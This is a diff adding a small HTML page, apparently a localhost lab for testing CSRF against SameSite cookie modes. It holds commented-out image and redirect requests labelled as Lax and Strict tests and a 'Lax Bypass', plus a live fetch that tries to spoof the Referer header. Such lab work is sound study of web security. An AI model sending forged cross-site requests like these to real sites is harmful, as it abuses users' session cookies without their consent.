@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF - SameSite</title>
+</head>
+
+<body>
+
+    <!-- Lax test -> cookie not included -->
+    <!-- <img src="http://127.0.0.1:3000/cookie" alt=""> -->
+
+    <!-- Lax Bypass -->
+     <!-- 
+    <script>
+        document.location.href="http://127.0.0.1:3000/cookie"
+     </script>
+     -->
+
+     <!-- Strict test -->
+      <!-- <img src="http://127.0.0.1:3000/cookie" alt=""> -> FAILED -->
+       <!-- <script>
+        document.location.href="http://127.0.0.1:3000/cookie"
+     </script> -->
+
+
+     <!-- Modify Referer Header -->
+      <script>
+        fetch('http://127.0.0.1:3000/cookie',
+            {
+                headers:{
+                    "Referer":"http://127.0.0.1:3000"
+                }
+            }
+        )
+      </script>
+</body>
+
+</html>
